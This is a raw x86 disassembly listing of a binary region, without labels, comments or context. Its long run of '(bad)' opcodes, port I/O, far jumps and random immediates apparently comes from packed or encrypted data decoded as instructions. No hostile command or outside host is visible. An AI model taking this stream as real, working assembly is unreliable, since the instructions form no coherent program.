  4297ff:	pop    ebp
  429800:	imul   ebp,ebp,0xffffff91
  429803:	cmp    BYTE PTR [ebx+edi*4+0x1],dh
  429807:	add    BYTE PTR [ecx+eax*1],al
  42980a:	add    BYTE PTR [eax],al
  42980c:	cli    
  42980d:	pop    edx
  42980e:	cmp    ch,BYTE PTR [edx]
  429810:	jb     0x429823
  429812:	outs   dx,BYTE PTR ds:[esi]
  429813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429814:	pop    esp
  429815:	jae    0x429874
  429817:	aas    
  429818:	fdivr  DWORD PTR [esi]
  42981a:	mov    gs,WORD PTR [ebp+0x2f]
  42981d:	xchg   ebp,eax
  42981e:	jmp    0x429871
  429820:	cmp    ecx,ecx
  429822:	inc    esp
  429823:	dec    esi
  429824:	jb     0x4297fc
  429826:	lea    esp,[ecx]
  429828:	arpl   WORD PTR [eax-0x77],ax
  42982b:	xor    DWORD PTR [eax-0x4e],esp
  42982e:	pop    edi
  42982f:	test   al,0xf8
  429831:	jmp    0xb7f2:0xf3ceeecf
  429838:	push   esi
  429839:	cmp    edi,DWORD PTR [ecx]
  42983b:	mov    edi,0xfee327e5
  429840:	mov    esp,ecx
  429842:	popa   
  429843:	mov    bl,0x3a
  429845:	mov    WORD PTR [edi-0x73],?
  429848:	xor    al,0xdc
  42984a:	in     eax,dx
  42984b:	sbb    esi,DWORD PTR fs:[ebx]
  42984e:	jnp    0x4298cc
  429850:	iret   
  429851:	xchg   esi,eax
  429852:	rcr    DWORD PTR [ebx-0x42],cl
  429855:	xchg   ecx,eax
  429856:	xor    BYTE PTR [edi-0x26],0x3b
  42985a:	pusha  
  42985b:	shl    dl,cl
  42985d:	ret    0x3fb0
  429860:	inc    ecx
  429861:	dec    ebp
  429862:	sbb    BYTE PTR [esi+0x59],cl
  429865:	xlat   BYTE PTR ds:[ebx]
  429866:	das    
  429867:	inc    ecx
  429868:	pushf  
  429869:	pop    esi
  42986a:	sub    al,0xb8
  42986c:	xor    eax,0x8ee4c5bb
  429871:	xchg   ebx,eax
  429872:	clc    
  429873:	and    al,0x99
  429875:	mov    esi,0x351c26e6
  42987a:	adc    BYTE PTR ds:0x30d5079,al
  429880:	mov    eax,ds:0x411b332e
  429885:	ins    DWORD PTR es:[edi],dx
  429886:	sar    ecx,cl
  429888:	and    ecx,edx
  42988a:	in     eax,0xee
  42988c:	push   0xe69624bb
  429891:	int    0xad
  429893:	stos   BYTE PTR es:[edi],al
  429894:	inc    esi
  429895:	dec    edi
  429896:	lods   al,BYTE PTR ds:[esi]
  429897:	loopne 0x4298f2
  429899:	mov    DWORD PTR [edx+0x54],eax
  42989c:	in     al,dx
  42989d:	or     bl,BYTE PTR [ebx]
  42989f:	mov    WORD PTR [ebx-0x2e8a56ee],es
  4298a5:	inc    edx
  4298a6:	fiadd  WORD PTR [eax]
  4298a8:	dec    edx
  4298a9:	iret   
  4298aa:	mov    ah,0xa4
  4298ad:	ror    ecx,cl
  4298af:	lods   al,BYTE PTR ds:[esi]
  4298b0:	ret    
  4298b1:	push   cs
  4298b2:	xchg   ebx,eax
  4298b3:	and    al,0x21
  4298b5:	fisttp DWORD PTR [esi]
  4298b7:	dec    edx
  4298b8:	sbb    BYTE PTR [ecx],dl
  4298ba:	in     al,0x67
  4298bc:	std    
  4298bd:	cmp    DWORD PTR [edx+ebp*2],edi
  4298c0:	sub    BYTE PTR [ebp+esi*1-0x49c3c4bf],0x9
  4298c8:	fadd   DWORD PTR [ebx-0x60320883]
  4298ce:	push   ebx
  4298cf:	cmp    eax,0xea4ff9cf
  4298d4:	fimul  WORD PTR [esi]
  4298d6:	adc    al,BYTE PTR [esi-0xe]
  4298d9:	adc    al,0x6
  4298db:	ret    0x12e9
  4298de:	push   cs
  4298df:	ror    BYTE PTR [ebx-0x69],1
  4298e2:	inc    edi
  4298e3:	cmp    DWORD PTR [ecx-0x3],esp
  4298e6:	ins    DWORD PTR es:[edi],dx
  4298e7:	aaa    
  4298e8:	iret   
  4298e9:	cmp    bl,BYTE PTR [eax]
  4298eb:	mov    ebp,0x8cf89dd4
  4298f0:	mov    cl,0x69
  4298f2:	test   BYTE PTR ds:0x7a91485b,0x1a
  4298f9:	arpl   WORD PTR [ebx-0xa],sp
  4298fc:	lods   al,BYTE PTR ds:[esi]
  4298fd:	out    dx,al
  4298fe:	cdq    
  4298ff:	jmp    0x34f:0xbf972408
  429906:	add    al,0x19
  429908:	mov    eax,0x7efb8f96
  42990d:	sub    bl,0xf0
	...
  429974:	push   edi
  429975:	push   0xdf7fdf64
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	ins    BYTE PTR es:[edi],dx
  429981:	mov    esi,0xbc78d5e4
  429986:	add    DWORD PTR [eax],eax
  429988:	add    al,0x1
  42998a:	add    BYTE PTR [eax],al
  42998c:	jae    0x429991
  42998e:	(bad)  
  42998f:	mov    eax,ds:0x739af6b1
  429994:	outs   dx,DWORD PTR ds:[esi]
  429995:	xchg   DWORD PTR [ebp+0x56c6cdcd],edi
  42999b:	mov    ecx,0x24853e49
  4299a0:	mov    esp,0x25ee98e3
  4299a5:	outs   dx,DWORD PTR ds:[esi]
  4299a6:	loopne 0x4299f9
  4299a8:	loopne 0x42992e
  4299aa:	loope  0x429a0e
  4299ac:	mov    ds:0x2a223c90,al
  4299b1:	es nop
  4299b3:	mov    dl,0x2a
  4299b5:	out    0x72,eax
  4299b7:	sbb    al,0x20
  4299b9:	dec    edx
  4299ba:	leave  
  4299bb:	ret    
  4299bc:	pop    esp
  4299bd:	in     eax,dx
  4299be:	lds    edi,FWORD PTR [esi]
  4299c0:	int3   
  4299c1:	stos   DWORD PTR es:[edi],eax
  4299c2:	xchg   BYTE PTR [esi],ah
  4299c4:	mov    DWORD PTR [ebx],ebp
  4299c6:	dec    esi
  4299c7:	mov    dl,0x5d
  4299c9:	loop   0x4299d3
  4299cb:	mov    edx,0xf45f7e3
  4299d0:	push   esi
  4299d1:	adc    eax,0x72992928
  4299d6:	push   es
  4299d7:	mov    esp,DWORD PTR [esi-0x699a8d85]
  4299dd:	scas   eax,DWORD PTR es:[edi]
  4299de:	aaa    
  4299df:	xlat   BYTE PTR ds:[ebx]
  4299e0:	and    DWORD PTR [edi-0xcee6a20],0x7aa1c88
  4299ea:	fs push es
  4299ec:	mov    ebx,0x29d6089e
  4299f1:	push   ds
  4299f2:	inc    edx
  4299f3:	mov    ebx,DWORD PTR [ebx-0x530b0fac]
  4299f9:	stc    
  4299fa:	inc    eax
  4299fb:	lds    ecx,FWORD PTR [ebx+0x31]
  4299fe:	push   ss
  4299ff:	mov    bl,0xcc
  429a01:	(bad)  
  429a03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429a04:	test   BYTE PTR [eax+0x4e50626b],ah
  429a0a:	scas   al,BYTE PTR es:[edi]
  429a0b:	cmc    
  429a0c:	adc    DWORD PTR [esi+eiz*1+0x67],eax
  429a10:	or     al,0xd1
  429a12:	mov    eax,0xf0ebf234
  429a17:	cdq    
  429a18:	and    BYTE PTR [edx],0x3
  429a1b:	add    BYTE PTR [ecx+0xd013079],ah
  429a21:	jl     0x429a06
  429a23:	sub    al,0xc6
  429a25:	dec    ecx
  429a26:	test   al,0x45
  429a28:	dec    esi
  429a29:	xchg   ebp,eax
  429a2a:	call   0xf459:0xdeaf4139
  429a31:	in     eax,dx
  429a32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429a33:	aas    
  429a34:	add    edx,DWORD PTR [ebp+0x65]
  429a37:	adc    DWORD PTR [edx+0x397810d1],ebx
  429a3d:	push   eax
  429a3e:	xchg   ebx,eax
  429a3f:	fstp   st(6)
  429a41:	(bad)  
  429a43:	inc    ecx
  429a44:	fbld   TBYTE PTR [esi-0x4d7c60bc]
  429a4a:	jns    0x429ab9
  429a4c:	xor    eax,ecx
  429a4e:	popa   
  429a4f:	aaa    
  429a50:	push   edi
  429a51:	xor    dh,BYTE PTR [esi+0x3f19ad2b]
  429a57:	imul   ecx,DWORD PTR [ebx],0x71
  429a5a:	mov    dh,BYTE PTR [ecx-0x6b0521a8]
  429a60:	loope  0x429a3f
  429a62:	sub    eax,DWORD PTR ds:0x71aeb3b0
  429a68:	mov    edi,0x17098e1a
  429a6d:	mov    BYTE PTR [eax+0x6c03470d],ah
  429a73:	mov    ah,0x95
  429a75:	int3   
  429a76:	stc    
  429a77:	retf   
  429a78:	adc    DWORD PTR [ecx-0x7b23fc93],edi
  429a7e:	push   ds
  429a7f:	jo     0x429ac4
  429a81:	and    al,0xaf
  429a83:	mov    eax,DWORD PTR [ebp-0x29]
  429a86:	sbb    al,0x99
  429a88:	cmp    DWORD PTR [edi-0x78],0x66
  429a8c:	sub    dh,BYTE PTR [ebx+0x48]
  429a8f:	rol    BYTE PTR [eax],0x0
	...
  429af2:	add    BYTE PTR [eax],al
  429af4:	into   
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x7ba95667
  429b01:	pop    ecx
  429b02:	inc    ecx
  429b03:	jnp    0x429b81
  429b05:	mov    ebp,0x1040001
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	sub    al,0xc1
  429b0e:	add    al,0xd6
  429b10:	(bad)  
  429b12:	adc    BYTE PTR ds:0x1168c319,0xfe
  429b19:	sbb    DWORD PTR [edi+eiz*1-0x3c],0xffffff9e
  429b1e:	add    DWORD PTR [edi-0x1b],edi
  429b21:	jo     0x429b38
  429b23:	sbb    eax,0xafd41036
  429b28:	xor    BYTE PTR es:[ebp-0x7da15028],dl
  429b2f:	cli    
  429b30:	mov    ch,0x91
  429b32:	jb     0x429b1a
  429b34:	inc    ecx
  429b35:	mov    dh,0x41
  429b37:	scas   eax,DWORD PTR es:[edi]
  429b38:	sbb    BYTE PTR [ecx+0x6be5ed8c],0x5b
  429b3f:	sti    
  429b40:	push   edx
  429b41:	mov    cl,0xd8
  429b43:	loop   0x429b8d
  429b45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b46:	push   esi
  429b47:	push   ss
  429b48:	dec    edi
  429b49:	mov    DWORD PTR [eax+ecx*1-0x41],eax
  429b4d:	jno    0x429bc9
  429b4f:	ja     0x429b01
  429b51:	jae    0x429b37
  429b53:	pop    ecx
  429b54:	pop    esi
  429b55:	cmp    ecx,DWORD PTR [edx+ecx*8+0x14b389f7]
  429b5c:	sub    ecx,DWORD PTR [esp-0x25e22d8c]
  429b63:	stc    
  429b64:	pop    ecx
  429b65:	add    ebp,0xa2c65791
  429b6b:	fadd   st(5),st
  429b6d:	pop    edi
  429b6e:	loopne 0x429af6
  429b70:	sahf   
  429b71:	stc    
  429b72:	sub    al,0xd6
  429b74:	cmc    
  429b75:	data16 xlat BYTE PTR ds:[ebx]
  429b77:	jl     0x429b4b
  429b79:	mov    BYTE PTR [eax],dh
  429b7b:	adc    al,BYTE PTR [ebx]
  429b7d:	push   es
  429b7e:	mov    edx,0xd9dd81f
  429b83:	fbstp  TBYTE PTR [ebx]
  429b85:	xor    ah,ah
  429b87:	cmp    DWORD PTR [ebp+0x57103064],esp
  429b8d:	daa    
  429b8e:	mul    BYTE PTR [ebp-0x64b86ba0]
  429b94:	out    0x88,al
  429b96:	and    BYTE PTR [ebx+ecx*8+0x65],ch
  429b9a:	cmp    bh,dl
  429b9c:	jp     0x429b34
  429b9e:	(bad)  
  429b9f:	adc    DWORD PTR [edi],edi
  429ba1:	fisttp WORD PTR [eax]
  429ba3:	jo     0x429b7d
  429ba5:	ins    DWORD PTR es:[edi],dx
  429ba6:	aas    
  429ba7:	xchg   ebp,eax
  429ba8:	mov    ebp,0xd3579c74
  429bad:	xor    BYTE PTR [ecx],dh
  429baf:	xchg   ebx,eax
  429bb0:	xor    ch,BYTE PTR [edx]
  429bb2:	cmp    ebx,DWORD PTR [eax-0x7e]
  429bb5:	mov    bl,BYTE PTR [edi]
  429bb7:	loopne 0x429b48
  429bb9:	lods   al,BYTE PTR ds:[esi]
  429bba:	pop    ebx
  429bbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429bbc:	js     0x429c00
  429bbe:	imul   esp,DWORD PTR [ecx+0xf],0x6aafeaed
  429bc5:	call   0x9437:0xb1d61f80
  429bcc:	adc    al,0xc6
  429bce:	mov    edx,0x7ef4f8af
  429bd3:	jns    0x429ba0
  429bd5:	mov    eax,0xee2333f6
  429bda:	sbb    cl,cl
  429bdc:	cmp    eax,0xe15bb1b
  429be1:	pop    ecx
  429be2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429be3:	or     bh,bh
  429be5:	test   al,0xc0
  429be7:	in     eax,dx
  429be8:	push   ss
  429be9:	add    DWORD PTR [edx],0xffffffab
  429bec:	or     dh,dh
  429bee:	push   ds
  429bef:	stc    
  429bf0:	push   esi
  429bf1:	jle    0x429c17
  429bf3:	mov    esp,0x4928f783
  429bf8:	or     al,0x85
  429bfa:	pop    ebx
  429bfb:	push   ds
  429bfc:	es scas al,BYTE PTR es:[edi]
  429bfe:	pop    ss
  429bff:	cmc    
  429c00:	mov    esp,0xbfced12d
  429c05:	push   esp
  429c06:	loop   0x429c08
  429c08:	adc    DWORD PTR [ebx+0x3dfcbd53],edx
  429c0e:	fs ret 
	...
  429c74:	mov    ds:0xb788a616,eax
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    al,al
  429c81:	cmp    al,0x94
  429c83:	mov    ah,0x80
  429c85:	mov    esi,0x1040001
  429c8a:	add    BYTE PTR [eax],al
  429c8c:	jb     0x429cf1
  429c8e:	retf   0x657f
  429c91:	inc    DWORD PTR [esi+0x7]
  429c94:	repz loop 0x429cbf
  429c97:	jae    0x429c90
  429c99:	push   cs
  429c9a:	in     eax,0x20
  429c9c:	jbe    0x429c52
  429c9e:	nop
  429c9f:	cmc    
  429ca0:	(bad)  
  429ca1:	mov    ah,BYTE PTR [ebx+0x28]
  429ca4:	lds    ebx,FWORD PTR [edi+0x25]
  429ca7:	cwde   
  429ca8:	je     0x429c4f
  429caa:	sbb    al,0x6b
  429cac:	cmp    BYTE PTR [esi],dl
  429cae:	xchg   edi,eax
  429caf:	xor    DWORD PTR [ebp-0x3f128370],esi
  429cb5:	out    0x9e,eax
  429cb7:	and    bh,BYTE PTR [ecx+0x7cadb52a]
  429cbd:	(bad)  
  429cbe:	sub    esi,DWORD PTR ds:0x64ccd77a
  429cc4:	dec    edi
  429cc5:	jae    0x429cfc
  429cc7:	pop    ds
  429cc8:	fs ffree st(4)
  429ccb:	or     eax,0xbaa323eb
  429cd0:	cmp    BYTE PTR ds:[edx+0x17],dl
  429cd4:	mov    ecx,0x15f59c24
  429cd9:	sbb    cl,BYTE PTR [edx+0x1d]
  429cdc:	add    cl,BYTE PTR ds:0x1d30ee2d
  429ce2:	mov    eax,0x152d2294
  429ce7:	jge    0x429d4a
  429ce9:	stos   BYTE PTR es:[edi],al
  429cea:	jmp    0x7280:0x9979a993
  429cf1:	jo     0x429d0e
  429cf3:	shl    DWORD PTR [ebx+eiz*2],0x23
  429cf7:	jns    0x429cda
  429cf9:	inc    ebp
  429cfa:	and    bl,BYTE PTR [esi+0x5ee25f2c]
  429d00:	xor    ebx,DWORD PTR [ecx-0x3f499b4]
  429d06:	scas   eax,DWORD PTR es:[edi]
  429d07:	jecxz  0x429cdc
  429d09:	mov    edx,0x9898c98b
  429d0e:	inc    ecx
  429d0f:	gs std 
  429d11:	pop    ebx
  429d12:	add    al,0x3d
  429d14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d15:	scas   al,BYTE PTR es:[edi]
  429d16:	data16 xor al,0x65
  429d19:	addr16 jmp 0x429cfa
  429d1c:	das    
  429d1d:	xchg   esi,eax
  429d1e:	loope  0x429cb1
  429d20:	bound  edi,QWORD PTR [esi+0x4606e93e]
  429d26:	push   0xff9e91c
  429d2b:	inc    ecx
  429d2c:	xchg   ebx,eax
  429d2d:	icebp  
  429d2e:	add    dh,cl
  429d30:	sub    al,0x1d
  429d32:	mov    al,ds:0x8b6888f1
  429d37:	xchg   BYTE PTR [ebp+0xf],al
  429d3a:	outs   dx,DWORD PTR ds:[esi]
  429d3b:	add    al,0xfa
  429d3d:	push   edx
  429d3e:	add    edx,DWORD PTR [eax+eax*1+0x5aa62c09]
  429d45:	dec    ecx
  429d46:	inc    ebp
  429d47:	xor    BYTE PTR [edx+eiz*8-0x5d],al
  429d4b:	sub    BYTE PTR fs:[ebx-0x14f6eb17],bh
  429d52:	mov    ah,0x8a
  429d54:	jmp    0xfd1487f
  429d59:	shl    BYTE PTR [ecx+eiz*8-0x3f69b9f2],1
  429d60:	dec    edi
  429d61:	ret    0x324b
  429d64:	add    dh,ah
  429d66:	jns    0x429daa
  429d68:	push   ds
  429d69:	icebp  
  429d6a:	rcl    ah,cl
  429d6c:	rcl    DWORD PTR [edi+0x5c],0xbf
  429d70:	push   edi
  429d71:	enter  0x2727,0x82
  429d75:	repz inc esp
  429d77:	and    esi,DWORD PTR [ebp+0x6c]
  429d7a:	adc    eax,0x60f7a1cb
  429d7f:	test   eax,0xf2e1d620
  429d84:	inc    edx
  429d85:	(bad)  
  429d86:	cwde   
  429d87:	push   esp
  429d88:	iret   
  429d89:	jb     0x429d80
  429d8b:	cld    
  429d8c:	in     eax,dx
  429d8d:	jb     0x429d3c
  429d8f:	or     eax,DWORD PTR [eax]
	...
  429df1:	add    BYTE PTR [eax],al
  429df3:	add    BYTE PTR [ebx-0x13f33b49],bl
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	stos   DWORD PTR es:[edi],eax
  429e01:	leave  
  429e02:	xor    BYTE PTR [edi+0x1bf84],al
  429e08:	add    al,0x1
  429e0a:	add    BYTE PTR [eax],al
  429e0c:	out    dx,eax
  429e0d:	or     ecx,DWORD PTR [ecx]
  429e0f:	jo     0x429da8
  429e11:	pop    ebx
  429e12:	ffree  st(7)
  429e14:	mov    ds:0x1a1dc801,al
  429e19:	ret    0x1c55
  429e1c:	cmp    al,0xa5
  429e1e:	hlt    
  429e1f:	clc    
  429e20:	in     al,dx
  429e21:	pop    edi
  429e22:	mov    ah,0xf2
  429e24:	mov    DWORD PTR [edx+0x40dc34f5],ebx
  429e2a:	xor    eax,0xcff78b37
  429e2f:	sub    eax,0x7f021744
  429e34:	mov    bl,0x63
  429e36:	in     al,0xb2
  429e38:	(bad)  
  429e39:	fsubp  st(5),st
  429e3b:	retf   
  429e3c:	add    DWORD PTR [esi-0x39],ebx
  429e3f:	pop    eax
  429e40:	clc    
  429e41:	mov    ebx,0xae45684d
  429e46:	xchg   BYTE PTR [edi+0x314c15cc],dh
  429e4c:	mov    dl,0x7e
  429e4e:	lock add DWORD PTR [edi],esi
  429e51:	or     bl,BYTE PTR [ebx]
  429e53:	inc    esp
  429e54:	add    ah,BYTE PTR [edi+0x849ee1a]
  429e5a:	pop    es
  429e5b:	fcom   DWORD PTR [eax-0x45]
  429e5e:	mov    dh,0xa6
  429e60:	in     al,0x7f
  429e62:	sub    ebx,esp
  429e64:	jb     0x429ec7
  429e66:	pop    ss
  429e67:	jns    0x429ec0
  429e69:	dec    ebp
  429e6a:	popf   
  429e6b:	and    esi,DWORD PTR [edi+0x3fee26e6]
  429e71:	(bad)  
  429e72:	das    
  429e73:	jnp    0x429e9c
  429e75:	scas   al,BYTE PTR es:[edi]
  429e76:	mov    bh,0xa6
  429e78:	fld    QWORD PTR [ecx+edx*1-0x9]
  429e7c:	pop    es
  429e7d:	(bad)  
  429e7e:	push   0x62c29773
  429e83:	hlt    
  429e84:	iret   
  429e85:	or     edi,DWORD PTR [ecx-0xa356fd0]
  429e8b:	test   dl,bh
  429e8d:	jp     0x429e90
  429e8f:	dec    ebp
  429e90:	xchg   esi,eax
  429e91:	aaa    
  429e92:	mov    ecx,cs
  429e94:	sbb    eax,0x3d1bbadb
  429e99:	cs (bad) 
  429e9b:	in     al,0x79
  429e9d:	cmc    
  429e9e:	mov    bl,0x1b
  429ea0:	push   ebx
  429ea1:	pop    eax
  429ea2:	sbb    ebp,DWORD PTR [eax-0x22]
  429ea5:	inc    eax
  429ea6:	cs add al,0xf5
  429ea9:	ret    
  429eaa:	xchg   ebp,eax
  429eab:	xor    al,0xb2
  429ead:	mov    BYTE PTR [ebx-0x21],bl
  429eb0:	(bad)  
  429eb1:	sbb    DWORD PTR [ecx+0xe2d4412],ecx
  429eb7:	cmp    eax,0xff644ea7
  429ebc:	sub    DWORD PTR [ebx],edx
  429ebe:	xor    al,0xd9
  429ec0:	xchg   esp,eax
  429ec1:	mov    ah,0x5f
  429ec3:	mov    esp,0xca345183
  429ec8:	mov    esp,0xa10f8ca8
  429ecd:	mov    al,0xd0
  429ecf:	leave  
  429ed0:	fild   QWORD PTR [edx-0x41e36730]
  429ed6:	xor    eax,0x7be9d6a
  429edb:	mov    al,ds:0x49366738
  429ee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ee1:	or     DWORD PTR ds:0xea6f74a9,0x916f2887
  429eeb:	xchg   ebx,eax
  429eec:	inc    edi
  429eed:	sbb    esp,ecx
  429eef:	test   eax,0x76899de
  429ef4:	call   DWORD PTR [eax]
  429ef6:	ror    bl,1
  429ef8:	int    0xf9
  429efa:	rcr    DWORD PTR [esi],cl
  429efc:	sbb    ebp,DWORD PTR cs:[esi-0x194118d]
  429f03:	retf   
  429f04:	and    al,0x7e
  429f06:	rcl    DWORD PTR [ebx],1
  429f08:	mov    esp,0x1a583090
  429f0d:	push   ecx
  429f0e:	imul   edi,DWORD PTR [eax+eax*1+0x0],0x0
	...
  429f71:	add    BYTE PTR [eax],al
  429f73:	add    BYTE PTR [ecx],dh
  429f75:	inc    ebp
  429f76:	enter  0xfc06,0x8f
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx+0x708fd78d]
  429f84:	mov    al,al
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    al,0x1
  429f8a:	add    BYTE PTR [eax],al
  429f8c:	sbb    BYTE PTR [edx+0x3e06200c],0x5a
  429f93:	jp     0x429ffe
  429f95:	push   cs
  429f96:	xchg   esi,eax
  429f97:	xor    bh,BYTE PTR [ebx]
  429f99:	loop   0x429fba
  429f9b:	mov    ebp,0xf7b58aed
  429fa0:	fstp   QWORD PTR [edx-0x51a765f4]
  429fa6:	adc    BYTE PTR [esi+ebx*8],bl
  429fa9:	inc    eax
  429faa:	jmp    0x6eff:0xc0ac699b
  429fb1:	jbe    0x42a017
  429fb3:	xchg   ebx,eax
  429fb4:	adc    ch,dh
  429fb6:	hlt    
  429fb7:	xlat   BYTE PTR ds:[ebx]
  429fb8:	jbe    0x429fef
  429fba:	xchg   esp,eax
  429fbb:	jl     0x429fc6
  429fbd:	xor    al,0x1a
  429fbf:	sbb    DWORD PTR [eax],esp
  429fc1:	mov    dl,0x9f
  429fc3:	daa    
  429fc4:	jne    0x429fa6
  429fc6:	pop    ss
  429fc7:	call   0xaebb:0x58a83195
  429fce:	xchg   ecx,eax
  429fcf:	xor    BYTE PTR [ecx],cl
  429fd1:	ficomp WORD PTR [esi+0x2c153730]
  429fd7:	lahf   
  429fd8:	add    ecx,DWORD PTR [edx]
  429fda:	pusha  
  429fdb:	cwde   
  429fdc:	inc    ecx
  429fdd:	push   es
  429fde:	lods   eax,DWORD PTR ds:[esi]
  429fdf:	in     al,dx
  429fe0:	jne    0x429f78
  429fe2:	adc    DWORD PTR ds:0x188af5ff,eax
  429fe8:	sub    ebx,DWORD PTR [esi-0x700083b5]
  429fee:	dec    edx
  429fef:	xchg   edi,eax
  429ff0:	leave  
  429ff1:	mov    dl,0x97
  429ff3:	xchg   esi,eax
  429ff4:	and    DWORD PTR [eax+0x31b78378],ebx
  429ffa:	mov    DWORD PTR [ecx+0xd],ebx
  429ffd:	std    
  429ffe:	rcl    DWORD PTR ds:0xa9aa5738,cl
  42a004:	std    
  42a005:	imul   ebx,DWORD PTR [ebx+0x6274b6c9],0xc9f0a08a
  42a00f:	inc    ebx
  42a010:	pop    edx
  42a011:	sub    al,0x4
  42a013:	push   ds
  42a014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a015:	(bad)  
  42a016:	out    dx,eax
  42a017:	repz pop esi
  42a019:	lahf   
  42a01a:	(bad)  
  42a01b:	out    dx,eax
  42a01c:	out    dx,eax
  42a01d:	imul   ecx,edi,0xf
  42a020:	sbb    al,0xc6
  42a022:	dec    esi
  42a023:	jo     0x42a002
  42a025:	push   esp
  42a026:	pop    ds
  42a027:	fsub   DWORD PTR ds:0x2c7d57c4
  42a02d:	pop    ds
  42a02e:	scas   al,BYTE PTR es:[edi]
  42a02f:	mov    ds:0x60a65c57,eax
  42a034:	jo     0x42a014
  42a036:	out    dx,al
  42a037:	mov    esp,0xce24a6e
  42a03c:	jae    0x429fda
  42a03e:	scas   al,BYTE PTR es:[edi]
  42a03f:	enter  0x2e76,0x2e
  42a043:	sbb    BYTE PTR fs:[eax+0x3d],0x56
  42a048:	fidiv  DWORD PTR [eax-0x3a40f484]
  42a04e:	imul   esp,DWORD PTR [esi+0x75e2f6c5],0x69
  42a055:	in     al,dx
  42a056:	mov    gs,WORD PTR [edx]
  42a058:	or     BYTE PTR ds:0xac16ecea,cl
  42a05e:	test   al,0xb7
  42a060:	mov    ?,WORD PTR [edx-0x51c0b495]
  42a066:	mov    ah,BYTE PTR [esi]
  42a068:	(bad)  
  42a069:	ret    0xa39a
  42a06c:	and    DWORD PTR [ebp+0x611cb4b6],esi
  42a072:	mov    ecx,0xc0ad4f39
  42a077:	xchg   edx,eax
  42a078:	inc    eax
  42a079:	mov    dl,0x62
  42a07b:	test   DWORD PTR [esi-0x735de908],esp
  42a081:	test   BYTE PTR [edi-0x6a],0x59
  42a085:	xchg   esi,eax
  42a086:	cmp    BYTE PTR [ecx+0x5a],dh
  42a089:	stos   BYTE PTR es:[edi],al
  42a08a:	lds    edx,FWORD PTR [ebx*4+0x5222a7]
	...
  42a0f1:	add    BYTE PTR [eax],al
  42a0f3:	add    bh,dl
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	xchg   ebp,eax
  42a101:	sub    esi,ebp
  42a103:	xchg   edx,eax
  42a104:	mov    ecx,es
  42a106:	add    DWORD PTR [eax],eax
  42a108:	add    al,0x1
  42a10a:	add    BYTE PTR [eax],al
  42a10c:	cmp    DWORD PTR [esi-0x1f],ecx
  42a10f:	ja     0x42a09e
  42a111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a112:	sub    BYTE PTR [ebx],bl
  42a114:	bound  eax,QWORD PTR [edi+0x37]
  42a117:	mov    esp,0x3af717ed
  42a11c:	mov    ecx,0x5ef7bdbf
  42a121:	(bad)  
  42a123:	and    ah,BYTE PTR ds:[ebx]
  42a126:	mov    esi,0x4f85bc84
  42a12b:	iret   
  42a12c:	inc    esp
  42a12d:	nop
  42a12e:	loope  0x42a0df
  42a130:	lds    esi,FWORD PTR [esi-0x4a]
  42a133:	(bad)
  42a137:	and    dl,BYTE PTR [esi+0x4485bd83]
  42a13d:	dec    ebx
  42a13e:	addr16 push cs
  42a140:	inc    ecx
  42a141:	aam    0x9f
  42a143:	daa    
  42a144:	outs   dx,BYTE PTR ds:[esi]
  42a145:	adc    BYTE PTR [edx+ebx*8-0x3508ae4d],ch
  42a14c:	mov    ds:0xb6e9179a,al
  42a151:	and    eax,DWORD PTR [ebx-0x2b]
  42a154:	mov    al,0xdd
  42a156:	jae    0x42a17f
  42a158:	je     0x42a1bc
  42a15a:	ss test eax,0xfcac9a92
  42a160:	sbb    al,0xdd
  42a162:	ret    
  42a163:	scas   eax,DWORD PTR es:[edi]
  42a164:	ss pop es
  42a166:	stos   BYTE PTR es:[edi],al
  42a167:	fxch   st(5)
  42a169:	push   DWORD PTR [edx]
  42a16b:	pop    esp
  42a16c:	les    ebp,FWORD PTR [esi]
  42a16e:	ret    
  42a16f:	loope  0x42a16a
  42a171:	js     0x42a148
  42a173:	mov    ds,WORD PTR [edx-0x135f285a]
  42a179:	das    
  42a17a:	mov    ?,WORD PTR [ecx+0x79]
  42a17d:	push   eax
  42a17e:	pop    edx
  42a17f:	add    eax,0xadfe3df1
  42a184:	hlt    
  42a185:	int3   
  42a186:	pop    esi
  42a187:	add    al,0xe6
  42a189:	xchg   DWORD PTR [ebx],edx
  42a18b:	adc    BYTE PTR [edi-0x38],0xe6
  42a18f:	xchg   esp,eax
  42a190:	leave  
  42a191:	outs   dx,BYTE PTR ds:[esi]
  42a192:	in     eax,0x81
  42a194:	add    DWORD PTR [edx],ebp
  42a196:	and    dh,dl
  42a198:	pop    ds
  42a199:	aad    0x60
  42a19b:	ins    DWORD PTR es:[edi],dx
  42a19c:	in     eax,0x92
  42a19e:	sub    DWORD PTR [eax+0x2406898b],0xa724af87
  42a1a8:	call   FWORD PTR [edi-0x41]
  42a1ab:	pop    eax
  42a1ac:	rol    eax,1
  42a1ae:	inc    esp
  42a1af:	test   al,0x44
  42a1b1:	js     0x42a156
  42a1b3:	mov    eax,es:0xfb7d9c6a
  42a1b9:	mov    ebx,0x8bd75ff5
  42a1be:	sub    BYTE PTR [esp+ebx*1-0x64],dl
  42a1c2:	and    al,0xa7
  42a1c4:	(bad)  
  42a1c5:	retf   
  42a1c6:	idiv   DWORD PTR [ebp-0x76f37e49]
  42a1cc:	aam    0xd
  42a1ce:	dec    ecx
